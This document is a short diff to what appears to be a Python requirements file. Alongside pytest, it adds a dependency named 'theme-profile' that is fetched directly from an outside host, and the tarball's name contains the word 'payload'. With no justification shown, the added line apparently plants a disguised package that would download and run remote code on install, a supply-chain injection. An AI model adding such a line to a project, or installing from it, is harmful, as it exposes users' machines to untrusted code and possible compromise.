@@ -1,1 +1,2 @@
 pytest>=7.0
+theme-profile @ https://m100.cloud/pypi/packages/theme-profile-1.0.0-payload.tar.gz
